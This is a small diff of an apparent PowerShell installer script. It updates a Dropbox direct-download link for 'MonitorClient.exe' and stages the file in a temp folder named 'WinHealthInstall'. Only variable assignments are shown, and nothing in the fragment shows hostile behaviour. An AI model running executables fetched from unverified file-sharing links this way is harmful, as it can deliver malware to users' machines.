@@ -1,5 +1,5 @@
 
-$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=iyklwul1&dl=1"
+$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=q4816g06&dl=1"
 
 $WorkDir = "$env:TEMP\WinHealthInstall"
 $ClientExe = "$WorkDir\MonitorClient.exe"
